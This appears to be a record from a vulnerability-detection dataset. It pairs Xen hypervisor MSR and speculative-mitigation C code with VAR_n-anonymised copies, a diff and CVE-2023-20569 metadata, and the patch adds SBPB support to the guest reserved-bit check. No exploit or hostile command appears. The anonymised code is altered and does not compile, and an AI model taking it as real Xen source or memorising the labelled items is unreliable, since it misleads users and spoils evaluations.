         * To match the RAZ semantics, implement as write-discard, except for
         * a cpufreq controller dom0 which has full access.
         */
    case MSR_IA32_PERF_CTL:
        if ( !(cp->x86_vendor & (X86_VENDOR_INTEL | X86_VENDOR_CENTAUR)) )
            goto gp_fault;

        if ( likely(!is_cpufreq_controller(d)) || wrmsr_safe(msr, val) == 0 )
            break;
        goto gp_fault;

    case MSR_PKRS:
        if ( !cp->feat.pks || val != (uint32_t)val )
            goto gp_fault;
        goto set_reg;

    case MSR_X2APIC_FIRST ... MSR_X2APIC_LAST:
        if ( !is_hvm_domain(d) || v != curr )
            goto gp_fault;

        ret = guest_wrmsr_x2apic(v, msr, val);
        break;

#ifdef CONFIG_HVM
    case MSR_IA32_BNDCFGS:
        if ( !cp->feat.mpx || /* Implies Intel HVM only */
             !is_canonical_address(val) || (val & IA32_BNDCFGS_RESERVED) )
            goto gp_fault;

        /*
         * While MPX instructions are supposed to be gated on XCR0.BND*, let's
         * nevertheless force the relevant XCR0 bits on when the feature is
         * being enabled in BNDCFGS.
         */
        if ( (val & IA32_BNDCFGS_ENABLE) &&
             !(v->arch.xcr0_accum & (X86_XCR0_BNDREGS | X86_XCR0_BNDCSR)) )
        {
            uint64_t xcr0 = get_xcr0();

            if ( v != curr ||
                 handle_xsetbv(XCR_XFEATURE_ENABLED_MASK,
                               xcr0 | X86_XCR0_BNDREGS | X86_XCR0_BNDCSR) )
                goto gp_fault;

            if ( handle_xsetbv(XCR_XFEATURE_ENABLED_MASK, xcr0) )
                /* nothing, best effort only */;
        }

        goto set_reg;
#endif /* CONFIG_HVM */

    case MSR_IA32_XSS:
        if ( !cp->xstate.xsaves )
            goto gp_fault;

        /* No XSS features currently supported for guests */
        if ( val != 0 )
            goto gp_fault;

        msrs->xss.raw = val;
        break;

    case 0x40000000 ... 0x400001ff:
        if ( is_viridian_domain(d) )
        {
            ret = guest_wrmsr_viridian(v, msr, val);
            break;
        }

        /* Fallthrough. */
    case 0x40000200 ... 0x400002ff:
        ret = guest_wrmsr_xen(v, msr, val);
        break;

    case MSR_TSC_AUX:
        if ( !cp->extd.rdtscp && !cp->feat.rdpid )
            goto gp_fault;
        if ( val != (uint32_t)val )
            goto gp_fault;

        msrs->tsc_aux = val;
        if ( v == curr )
            wrmsr_tsc_aux(val);
        break;

    case MSR_VIRT_SPEC_CTRL:
        if ( !cp->extd.virt_ssbd )
            goto gp_fault;

        /* Only supports SSBD bit, the rest are ignored. */
        if ( cpu_has_amd_ssbd )
        {
            if ( val & SPEC_CTRL_SSBD )
                msrs->spec_ctrl.raw |= SPEC_CTRL_SSBD;
            else
                msrs->spec_ctrl.raw &= ~SPEC_CTRL_SSBD;
        }
        else
        {
            msrs->virt_spec_ctrl.raw = val & SPEC_CTRL_SSBD;
            if ( v == curr )
                /*
                 * Propagate the value to hardware, as it won't be set on guest
                 * resume path.
                 */
                amd_set_legacy_ssbd(val & SPEC_CTRL_SSBD);
        }
        break;

    case MSR_AMD64_DE_CFG:
        /*
         * OpenBSD 6.7 will panic if writing to DE_CFG triggers a #GP:
         * https://www.illumos.org/issues/12998 - drop writes.
         */
        if ( !(cp->x86_vendor & (X86_VENDOR_AMD | X86_VENDOR_HYGON)) )
            goto gp_fault;
        break;

    case MSR_AMD64_DR0_ADDRESS_MASK:
    case MSR_AMD64_DR1_ADDRESS_MASK ... MSR_AMD64_DR3_ADDRESS_MASK:
        if ( !cp->extd.dbext || val != (uint32_t)val )
            goto gp_fault;

        msrs->dr_mask[
            array_index_nospec((msr == MSR_AMD64_DR0_ADDRESS_MASK)
                               ? 0 : (msr - MSR_AMD64_DR1_ADDRESS_MASK + 1),
                               ARRAY_SIZE(msrs->dr_mask))] = val;

        if ( v == curr && (curr->arch.dr7 & DR7_ACTIVE_MASK) )
            wrmsrl(msr, val);
        break;

    default:
        return X86EMUL_UNHANDLEABLE;
    }

    /*
     * Interim safety check that functions we dispatch to don't alias ""Not yet
     * handled by the new MSR infrastructure"".
     */
    ASSERT(ret != X86EMUL_UNHANDLEABLE);

    return ret;

 set_reg: /* Delegate register access to per-vm-type logic. */
    if ( is_pv_domain(d) )
        pv_set_reg(v, msr, val);
    else
        hvm_set_reg(v, msr, val);
    return X86EMUL_OKAY;

 gp_fault:
    return X86EMUL_EXCEPTION;
}","int guest_wrmsr(struct vcpu *VAR_0, uint32_t VAR_1, uint64_t VAR_2)
{
    const struct vcpu *VAR_3 = VAR_4;
    struct domain *VAR_5 = VAR_0->domain;
    const struct cpu_policy *VAR_6 = VAR_5->arch.cpu_policy;
    struct vcpu_msrs *VAR_7 = VAR_0->arch.msrs;
    int VAR_8 = VAR_9;

    switch ( VAR_1 )
    {
        uint64_t VAR_10;

        /* COMMENT_0 */
    case VAR_11:
    case VAR_12:
    case VAR_13:
    case VAR_14:
    case VAR_15:

        /* COMMENT_1 */
    case VAR_16:
    case VAR_17:
    case VAR_18:
    case VAR_19:
    case VAR_20 ... MSR_RTIT_ADDR_B(7):
    case VAR_21:
    case VAR_22:
    case VAR_23 ... MSR_INTERRUPT_SSP_TABLE:
    case VAR_24:
    case VAR_25:
    case VAR_26:
    case VAR_27:
    case VAR_28:
    case VAR_29:
        goto gp_fault;

    case VAR_30:
        BUILD_BUG_ON(VAR_31 != VAR_30);
        /* COMMENT_2 */
                                                                            
          
                                                                            
                                                                         
                                                          
           
        if ( VAR_6->x86_vendor != VAR_32 || VAR_2 != 0 )
            goto gp_fault;
        break;

    case VAR_33:
        /* COMMENT_9 */
                                                                             
                                                                            
           
        if ( is_pv_domain(VAR_5) ||
             VAR_6->x86_vendor != VAR_34 )
            goto gp_fault;
        break;

    case VAR_35:
        /* COMMENT_13 */
                                                                            
                                                                               
                                                                             
                            
           
        if ( is_pv_domain(VAR_5) ||
             VAR_6->x86_vendor != VAR_32 )
            goto gp_fault;
        break;

    case VAR_36:
        if ( (!VAR_6->feat.ibrsb && !VAR_6->extd.ibrs) ||
             (VAR_2 & ~msr_spec_ctrl_valid_bits(VAR_6)) )
            goto gp_fault;
        goto set_reg;

    case VAR_37:
        if ( !VAR_6->feat.ibrsb && !VAR_6->extd.ibpb )
            goto gp_fault; /* COMMENT_19 */

        VAR_10 = ~(VAR_38 |
                 (VAR_6->extd.sbpb ? VAR_39 : 0));

        if ( VAR_2 & VAR_10 )
            goto gp_fault; /* COMMENT_20 */

        if ( VAR_0 == VAR_3 )
            wrmsrl(VAR_37, VAR_2);
        break;

    case VAR_40:
        if ( !VAR_6->feat.l1d_flush )
            goto gp_fault; /* COMMENT_19 */

        if ( VAR_2 & ~VAR_41 )
            goto gp_fault; /* COMMENT_20 */

        if ( VAR_0 == VAR_3 )
            wrmsrl(VAR_40, VAR_2);
        break;

    case VAR_42:
    {
        bool VAR_43 = VAR_7->misc_features_enables.cpuid_faulting;

        VAR_10 = ~0ULL;
        if ( VAR_6->platform_info.cpuid_faulting )
            VAR_10 &= ~VAR_44;

        if ( VAR_2 & VAR_10 )
            goto gp_fault;

        VAR_7->misc_features_enables.raw = VAR_2;

        if ( VAR_0 == VAR_3 && is_hvm_domain(VAR_5) && VAR_45 &&
             (VAR_43 ^ VAR_7->misc_features_enables.cpuid_faulting) )
            ctxt_switch_levelling(VAR_0);
        break;
    }

    case VAR_46     ... MSR_IA32_MCG_CTL:      /* COMMENT_21 */
    case MSR_IA32_MCx_CTL2(0) ... MSR_IA32_MCx_CTL2(31): /* COMMENT_22 */
    case MSR_IA32_MCx_CTL(0)  ... MSR_IA32_MCx_MISC(31): /* COMMENT_23 */
    case VAR_47:                           /* COMMENT_24 */
        if ( vmce_wrmsr(VAR_1, VAR_2) < 0 )
            goto gp_fault;
        break;

        /* COMMENT_25 */
                                                                             
                                                       
          
                                                                             
                                                           
           
    case VAR_48:
        if ( !(VAR_6->x86_vendor & (VAR_32 | VAR_49)) )
            goto gp_fault;

        if ( likely(!is_cpufreq_controller(VAR_5)) || wrmsr_safe(VAR_1, VAR_2) == 0 )
            break;
        goto gp_fault;

    case VAR_50:
        if ( !VAR_6->feat.pks || VAR_2 != (uint32_t)VAR_2 )
            goto gp_fault;
        goto set_reg;

    case VAR_51 ... MSR_X2APIC_LAST:
        if ( !is_hvm_domain(VAR_5) || VAR_0 != VAR_3 )
            goto gp_fault;

        VAR_8 = guest_wrmsr_x2apic(VAR_0, VAR_1, VAR_2);
        break;

#ifdef VAR_52
    case VAR_53:
        if ( !VAR_6->feat.mpx || /* COMMENT_32 */
             !is_canonical_address(VAR_2) || (VAR_2 & VAR_54) )
            goto gp_fault;

        /* COMMENT_33 */
                                                                              
                                                                           
                                    
           
        if ( (VAR_2 & VAR_55) &&
             !(VAR_0->arch.xcr0_accum & (VAR_56 | VAR_57)) )
        {
            uint64_t VAR_58 = get_xcr0();

            if ( VAR_0 != VAR_3 ||
                 handle_xsetbv(VAR_59,
                               VAR_58 | VAR_56 | VAR_57) )
                goto gp_fault;

            if ( handle_xsetbv(VAR_59, VAR_58) )
                /* COMMENT_38 */;
        }

        goto set_reg;
#endif /* COMMENT_39 */

    case VAR_60:
        if ( !VAR_6->xstate.xsaves )
            goto gp_fault;

        /* COMMENT_40 */
        if ( VAR_2 != 0 )
            goto gp_fault;

        VAR_7->xss.raw = VAR_2;
        break;

    case 0x40000000 ... 0x400001ff:
        if ( is_viridian_domain(VAR_5) )
        {
            VAR_8 = guest_wrmsr_viridian(VAR_0, VAR_1, VAR_2);
            break;
        }

        /* COMMENT_41 */
    case 0x40000200 ... 0x400002ff:
        VAR_8 = guest_wrmsr_xen(VAR_0, VAR_1, VAR_2);
        break;

    case VAR_61:
        if ( !VAR_6->extd.rdtscp && !VAR_6->feat.rdpid )
            goto gp_fault;
        if ( VAR_2 != (uint32_t)VAR_2 )
            goto gp_fault;

        VAR_7->tsc_aux = VAR_2;
        if ( VAR_0 == VAR_3 )
            wrmsr_tsc_aux(VAR_2);
        break;

    case VAR_62:
        if ( !VAR_6->extd.virt_ssbd )
            goto gp_fault;

        /* COMMENT_42 */
        if ( VAR_63 )
        {
            if ( VAR_2 & VAR_64 )
                VAR_7->spec_ctrl.raw |= VAR_64;
            else
                VAR_7->spec_ctrl.raw &= ~VAR_64;
        }
        else
        {
            VAR_7->virt_spec_ctrl.raw = VAR_2 & VAR_64;
            if ( VAR_0 == VAR_3 )
                /* COMMENT_43 */
                                                                               
                               
                   
                amd_set_legacy_ssbd(VAR_2 & VAR_64);
        }
        break;

    case VAR_65:
        /* COMMENT_47 */
                                                                      
                                                              
           
        if ( !(VAR_6->x86_vendor & (VAR_34 | VAR_66)) )
            goto gp_fault;
        break;

    case VAR_67:
    case VAR_68 ... MSR_AMD64_DR3_ADDRESS_MASK:
        if ( !VAR_6->extd.dbext || VAR_2 != (uint32_t)VAR_2 )
            goto gp_fault;

        VAR_7->dr_mask[
            array_index_nospec((VAR_1 == VAR_67)
                               ? 0 : (VAR_1 - VAR_68 + 1),
                               ARRAY_SIZE(VAR_7->dr_mask))] = VAR_2;

        if ( VAR_0 == VAR_3 && (VAR_3->arch.dr7 & VAR_69) )
            wrmsrl(VAR_1, VAR_2);
        break;

    default:
        return VAR_70;
    }

    /* COMMENT_51 */
                                                                              
                                              
       
    ASSERT(VAR_8 != VAR_70);

    return VAR_8;

 set_reg: /* COMMENT_55 */
    if ( is_pv_domain(VAR_5) )
        pv_set_reg(VAR_0, VAR_1, VAR_2);
    else
        hvm_set_reg(VAR_0, VAR_1, VAR_2);
    return VAR_9;

 gp_fault:
    return VAR_71;
}",xen-project/xen/2280b0ee2aed6e0fd4af3fa31bf99bc04d038bfe/msr.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -79,7 +79,10 @@
         if ( !cp->feat.ibrsb && !cp->extd.ibpb )
             goto gp_fault; /* MSR available? */
 
-        if ( val & ~PRED_CMD_IBPB )
+        rsvd = ~(PRED_CMD_IBPB |
+                 (cp->extd.sbpb ? PRED_CMD_SBPB : 0));
+
+        if ( val & rsvd )
             goto gp_fault; /* Rsvd bit set? */
 
         if ( v == curr )","{'deleted_lines': ['        if ( val & ~PRED_CMD_IBPB )'], 'added_lines': ['        rsvd = ~(PRED_CMD_IBPB |', '                 (cp->extd.sbpb ? PRED_CMD_SBPB : 0));', '', '        if ( val & rsvd )']}",True,"


A side channel vulnerability on some of the AMD CPUs may allow an attacker to influence the return address prediction. This may result in speculative execution at an attacker-controlledaddress, potentially leading to information disclosure.



















",4.7,MEDIUM,1,valid,2023-06-14T08:13:28Z,4
CVE-2023-20569,['CWE-203'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N,1,xen-project/xen,"x86/spec-ctrl: Enumerations for Speculative Return Stack Overflow

AMD have specified new CPUID bits relating to SRSO.

 * SRSO_NO indicates that hardware is no longer vulnerable to SRSO.
 * IBPB_BRTYPE indicates that IBPB flushes branch type information too.
 * SBPB indicates support for a relaxed form of IBPB that does not flush
   branch type information.

Current CPUs (Zen4 and older) are not expected to enumerate these bits.
Native software is expected to synthesise them for guests using model and
microcode revision checks.

Two are just status bits, and SBPB is trivial to support for guests by
tweaking the reserved bit calculation in guest_wrmsr() and feature
dependencies.  Expose all by default to guests, so they start showing up when
Xen synthesises them.

While adding feature dependenies for IBPB, fix up an overlooked issue from
XSA-422.  It's inappropriate to advertise that IBPB flushes RET predictions if
IBPB is unavailable itself.

This is part of XSA-434 / CVE-2023-20569

Signed-off-by: Andrew Cooper <andrew.cooper3@citrix.com>
Reviewed-by: Jan Beulich <jbeulich@suse.com>
Reviewed-by: Roger Pau Monn <roger.pau@citrix.com>",2280b0ee2aed6e0fd4af3fa31bf99bc04d038bfe,https://github.com/xen-project/xen/commit/2280b0ee2aed6e0fd4af3fa31bf99bc04d038bfe,xen/arch/x86/spec_ctrl.c,print_details,"static void __init print_details(enum ind_thunk thunk)
{
unsigned int _7d0 = 0, _7d2 = 0, e8b = 0, max = 0, tmp;
uint64_t caps = 0;
if ( boot_cpu_data.cpuid_level >= 7 )
cpuid_count(7, 0, &max, &tmp, &tmp, &_7d0);
if ( max >= 2 )
cpuid_count(7, 2, &tmp, &tmp, &tmp, &_7d2);
if ( boot_cpu_data.extended_cpuid_level >= 0x80000008 )
cpuid(0x80000008, &tmp, &e8b, &tmp, &tmp);
if ( cpu_has_arch_caps )
rdmsrl(MSR_ARCH_CAPABILITIES, caps);
printk(""Speculative mitigation facilities:\n"");
printk(""  Hardware hints:%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n"",
(caps & ARCH_CAPS_RDCL_NO)                        ? "" RDCL_NO""        : """",
(caps & ARCH_CAPS_EIBRS)                          ? "" EIBRS""          : """",
(caps & ARCH_CAPS_RSBA)                           ? "" RSBA""           : """",
(caps & ARCH_CAPS_RRSBA)                          ? "" RRSBA""          : """",
(caps & ARCH_CAPS_SKIP_L1DFL)                     ? "" SKIP_L1DFL""     : """",
(e8b  & cpufeat_mask(X86_FEATURE_SSB_NO)) ||
(caps & ARCH_CAPS_SSB_NO)                         ? "" SSB_NO""         : """",
(caps & ARCH_CAPS_MDS_NO)                         ? "" MDS_NO""         : """",
(caps & ARCH_CAPS_TAA_NO)                         ? "" TAA_NO""         : """",
(caps & ARCH_CAPS_SBDR_SSDP_NO)                   ? "" SBDR_SSDP_NO""   : """",
(caps & ARCH_CAPS_FBSDP_NO)                       ? "" FBSDP_NO""       : """",
(caps & ARCH_CAPS_PSDP_NO)                        ? "" PSDP_NO""        : """",
(caps & ARCH_CAPS_FB_CLEAR)                       ? "" FB_CLEAR""       : """",
(caps & ARCH_CAPS_PBRSB_NO)                       ? "" PBRSB_NO""       : """",
(e8b  & cpufeat_mask(X86_FEATURE_IBRS_ALWAYS))    ? "" IBRS_ALWAYS""    : """",
(e8b  & cpufeat_mask(X86_FEATURE_STIBP_ALWAYS))   ? "" STIBP_ALWAYS""   : """",
(e8b  & cpufeat_mask(X86_FEATURE_IBRS_FAST))      ? "" IBRS_FAST""      : """",
(e8b  & cpufeat_mask(X86_FEATURE_IBRS_SAME_MODE)) ? "" IBRS_SAME_MODE"" : """",
(e8b  & cpufeat_mask(X86_FEATURE_BTC_NO))         ? "" BTC_NO""         : """",
(e8b  & cpufeat_mask(X86_FEATURE_IBPB_RET))       ? "" IBPB_RET""       : """");
printk(""  Hardware features:%s%s%s%s%s%s%s%s%s%s%s\n"",
(e8b  & cpufeat_mask(X86_FEATURE_IBPB)) ||
(_7d0 & cpufeat_mask(X86_FEATURE_IBRSB))          ? "" IBPB""           : """",
(e8b  & cpufeat_mask(X86_FEATURE_IBRS)) ||
(_7d0 & cpufeat_mask(X86_FEATURE_IBRSB))          ? "" IBRS""           : """",
(e8b  & cpufeat_mask(X86_FEATURE_AMD_STIBP)) ||
(_7d0 & cpufeat_mask(X86_FEATURE_STIBP))          ? "" STIBP""          : """",
(e8b  & cpufeat_mask(X86_FEATURE_AMD_SSBD)) ||
(_7d0 & cpufeat_mask(X86_FEATURE_SSBD))           ? "" SSBD""           : """",
(_7d2 & cpufeat_mask(X86_FEATURE_INTEL_PSFD)) ||
(e8b  & cpufeat_mask(X86_FEATURE_PSFD))           ? "" PSFD""           : """",
(_7d0 & cpufeat_mask(X86_FEATURE_L1D_FLUSH))      ? "" L1D_FLUSH""      : """",
(_7d0 & cpufeat_mask(X86_FEATURE_MD_CLEAR))       ? "" MD_CLEAR""       : """",
(_7d0 & cpufeat_mask(X86_FEATURE_SRBDS_CTRL))     ? "" SRBDS_CTRL""     : """",
(e8b  & cpufeat_mask(X86_FEATURE_VIRT_SSBD))      ? "" VIRT_SSBD""      : """",
(caps & ARCH_CAPS_TSX_CTRL)                       ? "" TSX_CTRL""       : """",
(caps & ARCH_CAPS_FB_CLEAR_CTRL)                  ? "" FB_CLEAR_CTRL""  : """");
if ( IS_ENABLED(CONFIG_INDIRECT_THUNK) || IS_ENABLED(CONFIG_SHADOW_PAGING) )
printk(""  Compiled-in support:""
#ifdef CONFIG_INDIRECT_THUNK
"" INDIRECT_THUNK""
#endif
#ifdef CONFIG_SHADOW_PAGING
"" SHADOW_PAGING""
#endif
""\n"");
printk(""  Xen settings: BTI-Thunk %s, SPEC_CTRL: %s%s%s%s%s, Other:%s%s%s%s%s\n"",
thunk == THUNK_NONE      ? ""N/A"" :
thunk == THUNK_RETPOLINE ? ""RETPOLINE"" :
thunk == THUNK_LFENCE    ? ""LFENCE"" :
thunk == THUNK_JMP       ? ""JMP"" : ""?"",
(!boot_cpu_has(X86_FEATURE_IBRSB) &&
!boot_cpu_has(X86_FEATURE_IBRS))         ? ""No"" :
(default_xen_spec_ctrl & SPEC_CTRL_IBRS)  ? ""IBRS+"" :  ""IBRS-"",
(!boot_cpu_has(X86_FEATURE_STIBP) &&
!boot_cpu_has(X86_FEATURE_AMD_STIBP))    ? """" :
(default_xen_spec_ctrl & SPEC_CTRL_STIBP) ? "" STIBP+"" : "" STIBP-"",
(!boot_cpu_has(X86_FEATURE_SSBD) &&
!boot_cpu_has(X86_FEATURE_AMD_SSBD))     ? """" :
(default_xen_spec_ctrl & SPEC_CTRL_SSBD)  ? "" SSBD+"" : "" SSBD-"",
(!boot_cpu_has(X86_FEATURE_PSFD) &&
!boot_cpu_has(X86_FEATURE_INTEL_PSFD))   ? """" :
(default_xen_spec_ctrl & SPEC_CTRL_PSFD)  ? "" PSFD+"" : "" PSFD-"",
!(caps & ARCH_CAPS_TSX_CTRL)              ? """" :
(opt_tsx & 1)                             ? "" TSX+"" : "" TSX-"",
!cpu_has_srbds_ctrl                       ? """" :
opt_srb_lock                              ? "" SRB_LOCK+"" : "" SRB_LOCK-"",
opt_ibpb_ctxt_switch                      ? "" IBPB-ctxt"" : """",
opt_l1d_flush                             ? "" L1D_FLUSH"" : """",
opt_md_clear_pv || opt_md_clear_hvm ||
opt_fb_clear_mmio                         ? "" VERW""  : """",
opt_branch_harden                         ? "" BRANCH_HARDEN"" : """");
if ( cpu_has_bug_l1tf || opt_pv_l1tf_hwdom || opt_pv_l1tf_domu )
printk(""  L1TF: believed%s vulnerable, maxphysaddr L1D %u, CPUID %u""
"", Safe address %""PRIx64""\n"",
cpu_has_bug_l1tf ? """" : "" not"",
l1d_maxphysaddr, paddr_bits, l1tf_safe_maddr);
#ifdef CONFIG_HVM
printk(""  Support for HVM VMs:%s%s%s%s%s%s%s\n"",
(boot_cpu_has(X86_FEATURE_SC_MSR_HVM) ||
boot_cpu_has(X86_FEATURE_SC_RSB_HVM) ||
boot_cpu_has(X86_FEATURE_IBPB_ENTRY_HVM) ||
amd_virt_spec_ctrl ||
opt_eager_fpu || opt_md_clear_hvm)       ? """"               : "" None"",
boot_cpu_has(X86_FEATURE_SC_MSR_HVM)      ? "" MSR_SPEC_CTRL"" : """",
(boot_cpu_has(X86_FEATURE_SC_MSR_HVM) ||
amd_virt_spec_ctrl)                      ? "" MSR_VIRT_SPEC_CTRL"" : """",
boot_cpu_has(X86_FEATURE_SC_RSB_HVM)      ? "" RSB""           : """",
opt_eager_fpu                             ? "" EAGER_FPU""     : """",
opt_md_clear_hvm                          ? "" MD_CLEAR""      : """",
boot_cpu_has(X86_FEATURE_IBPB_ENTRY_HVM)  ? "" IBPB-entry""    : """");
#endif
#ifdef CONFIG_PV
printk(""  Support for PV VMs:%s%s%s%s%s%s\n"",
(boot_cpu_has(X86_FEATURE_SC_MSR_PV) ||
boot_cpu_has(X86_FEATURE_SC_RSB_PV) ||
boot_cpu_has(X86_FEATURE_IBPB_ENTRY_PV) ||
opt_eager_fpu || opt_md_clear_pv)        ? """"               : "" None"",
boot_cpu_has(X86_FEATURE_SC_MSR_PV)       ? "" MSR_SPEC_CTRL"" : """",
boot_cpu_has(X86_FEATURE_SC_RSB_PV)       ? "" RSB""           : """",
opt_eager_fpu                             ? "" EAGER_FPU""     : """",
opt_md_clear_pv                           ? "" MD_CLEAR""      : """",
boot_cpu_has(X86_FEATURE_IBPB_ENTRY_PV)   ? "" IBPB-entry""    : """");
printk(""  XPTI (64-bit PV only): Dom0 %s, DomU %s (with%s PCID)\n"",
opt_xpti_hwdom ? ""enabled"" : ""disabled"",
opt_xpti_domu  ? ""enabled"" : ""disabled"",
xpti_pcid_enabled() ? """" : ""out"");
printk(""  PV L1TF shadowing: Dom0 %s, DomU %s\n"",
opt_pv_l1tf_hwdom ? ""enabled""  : ""disabled"",
opt_pv_l1tf_domu  ? ""enabled""  : ""disabled"");
#endif
}","static void __init print_details(enum ind_thunk VAR_0)
{
unsigned int VAR_1 = 0, VAR_2 = 0, VAR_3 = 0, VAR_4 = 0, VAR_5;
uint64_t VAR_6 = 0;
if ( VAR_7.cpuid_level >= 7 )
cpuid_count(7, 0, &VAR_4, &VAR_5, &VAR_5, &VAR_1);
if ( VAR_4 >= 2 )
cpuid_count(7, 2, &VAR_5, &VAR_5, &VAR_5, &VAR_2);
if ( VAR_7.extended_cpuid_level >= 0x80000008 )
cpuid(0x80000008, &VAR_5, &VAR_3, &VAR_5, &VAR_5);
if ( VAR_8 )
rdmsrl(VAR_9, VAR_6);
printk(""Speculative mitigation facilities:\n"");
printk(""  Hardware hints:%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n"",
(VAR_6 & VAR_10)                        ? "" RDCL_NO""        : """",
(VAR_6 & VAR_11)                          ? "" EIBRS""          : """",
(VAR_6 & VAR_12)                           ? "" RSBA""           : """",
(VAR_6 & VAR_13)                          ? "" RRSBA""          : """",
(VAR_6 & VAR_14)                     ? "" SKIP_L1DFL""     : """",
(VAR_3  & cpufeat_mask(VAR_15)) ||
(VAR_6 & VAR_16)                         ? "" SSB_NO""         : """",
(VAR_6 & VAR_17)                         ? "" MDS_NO""         : """",
(VAR_6 & VAR_18)                         ? "" TAA_NO""         : """",
(VAR_6 & VAR_19)                   ? "" SBDR_SSDP_NO""   : """",
(VAR_6 & VAR_20)                       ? "" FBSDP_NO""       : """",
(VAR_6 & VAR_21)                        ? "" PSDP_NO""        : """",
(VAR_6 & VAR_22)                       ? "" FB_CLEAR""       : """",
(VAR_6 & VAR_23)                       ? "" PBRSB_NO""       : """",
(VAR_3  & cpufeat_mask(VAR_24))    ? "" IBRS_ALWAYS""    : """",
(VAR_3  & cpufeat_mask(VAR_25))   ? "" STIBP_ALWAYS""   : """",
(VAR_3  & cpufeat_mask(VAR_26))      ? "" IBRS_FAST""      : """",
(VAR_3  & cpufeat_mask(VAR_27)) ? "" IBRS_SAME_MODE"" : """",
(VAR_3  & cpufeat_mask(VAR_28))         ? "" BTC_NO""         : """",
(VAR_3  & cpufeat_mask(VAR_29))       ? "" IBPB_RET""       : """");
printk(""  Hardware features:%s%s%s%s%s%s%s%s%s%s%s\n"",
(VAR_3  & cpufeat_mask(VAR_30)) ||
(VAR_1 & cpufeat_mask(VAR_31))          ? "" IBPB""           : """",
(VAR_3  & cpufeat_mask(VAR_32)) ||
(VAR_1 & cpufeat_mask(VAR_31))          ? "" IBRS""           : """",
(VAR_3  & cpufeat_mask(VAR_33)) ||
(VAR_1 & cpufeat_mask(VAR_34))          ? "" STIBP""          : """",
(VAR_3  & cpufeat_mask(VAR_35)) ||
(VAR_1 & cpufeat_mask(VAR_36))           ? "" SSBD""           : """",
(VAR_2 & cpufeat_mask(VAR_37)) ||
(VAR_3  & cpufeat_mask(VAR_38))           ? "" PSFD""           : """",
(VAR_1 & cpufeat_mask(VAR_39))      ? "" L1D_FLUSH""      : """",
(VAR_1 & cpufeat_mask(VAR_40))       ? "" MD_CLEAR""       : """",
(VAR_1 & cpufeat_mask(VAR_41))     ? "" SRBDS_CTRL""     : """",
(VAR_3  & cpufeat_mask(VAR_42))      ? "" VIRT_SSBD""      : """",
(VAR_6 & VAR_43)                       ? "" TSX_CTRL""       : """",
(VAR_6 & VAR_44)                  ? "" FB_CLEAR_CTRL""  : """");
if ( IS_ENABLED(VAR_45) || IS_ENABLED(VAR_46) )
printk(""  Compiled-in support:""
#ifdef VAR_45
"" INDIRECT_THUNK""
#endif
#ifdef VAR_46
"" SHADOW_PAGING""
#endif
""\n"");
printk(""  Xen settings: BTI-Thunk %s, SPEC_CTRL: %s%s%s%s%s, Other:%s%s%s%s%s\n"",
VAR_0 == VAR_47      ? ""N/A"" :
VAR_0 == VAR_48 ? ""RETPOLINE"" :
VAR_0 == VAR_49    ? ""LFENCE"" :
VAR_0 == VAR_50       ? ""JMP"" : ""?"",
(!boot_cpu_has(VAR_31) &&
!boot_cpu_has(VAR_32))         ? ""No"" :
(VAR_51 & VAR_52)  ? ""IBRS+"" :  ""IBRS-"",
(!boot_cpu_has(VAR_34) &&
!boot_cpu_has(VAR_33))    ? """" :
(VAR_51 & VAR_53) ? "" STIBP+"" : "" STIBP-"",
(!boot_cpu_has(VAR_36) &&
!boot_cpu_has(VAR_35))     ? """" :
(VAR_51 & VAR_54)  ? "" SSBD+"" : "" SSBD-"",
(!boot_cpu_has(VAR_38) &&
!boot_cpu_has(VAR_37))   ? """" :
(VAR_51 & VAR_55)  ? "" PSFD+"" : "" PSFD-"",
!(VAR_6 & VAR_43)              ? """" :
(VAR_56 & 1)                             ? "" TSX+"" : "" TSX-"",
!VAR_57                       ? """" :
VAR_58                              ? "" SRB_LOCK+"" : "" SRB_LOCK-"",
VAR_59                      ? "" IBPB-ctxt"" : """",
VAR_60                             ? "" L1D_FLUSH"" : """",
VAR_61 || VAR_62 ||
VAR_63                         ? "" VERW""  : """",
VAR_64                         ? "" BRANCH_HARDEN"" : """");
if ( VAR_65 || VAR_66 || VAR_67 )
printk(""  L1TF: believed%s vulnerable, maxphysaddr L1D %u, CPUID %u""
"", Safe address %""VAR_68""\n"",
VAR_65 ? """" : "" not"",
VAR_69, VAR_70, VAR_71);
#ifdef VAR_72
printk(""  Support for HVM VMs:%s%s%s%s%s%s%s\n"",
(boot_cpu_has(VAR_73) ||
boot_cpu_has(VAR_74) ||
boot_cpu_has(VAR_75) ||
VAR_76 ||
VAR_77 || VAR_62)       ? """"               : "" None"",
boot_cpu_has(VAR_73)      ? "" MSR_SPEC_CTRL"" : """",
(boot_cpu_has(VAR_73) ||
VAR_76)                      ? "" MSR_VIRT_SPEC_CTRL"" : """",
boot_cpu_has(VAR_74)      ? "" RSB""           : """",
VAR_77                             ? "" EAGER_FPU""     : """",
VAR_62                          ? "" MD_CLEAR""      : """",
boot_cpu_has(VAR_75)  ? "" IBPB-entry""    : """");
#endif
#ifdef VAR_78
printk(""  Support for PV VMs:%s%s%s%s%s%s\n"",
(boot_cpu_has(VAR_79) ||
boot_cpu_has(VAR_80) ||
boot_cpu_has(VAR_81) ||
VAR_77 || VAR_61)        ? """"               : "" None"",
boot_cpu_has(VAR_79)       ? "" MSR_SPEC_CTRL"" : """",
boot_cpu_has(VAR_80)       ? "" RSB""           : """",
VAR_77                             ? "" EAGER_FPU""     : """",
VAR_61                           ? "" MD_CLEAR""      : """",
boot_cpu_has(VAR_81)   ? "" IBPB-entry""    : """");
printk(""  XPTI (64-bit PV only): Dom0 %s, DomU %s (with%s PCID)\n"",
VAR_82 ? ""enabled"" : ""disabled"",
VAR_83  ? ""enabled"" : ""disabled"",
xpti_pcid_enabled() ? """" : ""out"");
printk(""  PV L1TF shadowing: Dom0 %s, DomU %s\n"",
VAR_66 ? ""enabled""  : ""disabled"",
VAR_67  ? ""enabled""  : ""disabled"");
#endif
}",,"static void __init print_details(enum ind_thunk thunk)
{
    unsigned int _7d0 = 0, _7d2 = 0, e8b = 0, e21a = 0, max = 0, tmp;
    uint64_t caps = 0;

    /* Collect diagnostics about available mitigations. */
    if ( boot_cpu_data.cpuid_level >= 7 )
        cpuid_count(7, 0, &max, &tmp, &tmp, &_7d0);
    if ( max >= 2 )
        cpuid_count(7, 2, &tmp, &tmp, &tmp, &_7d2);
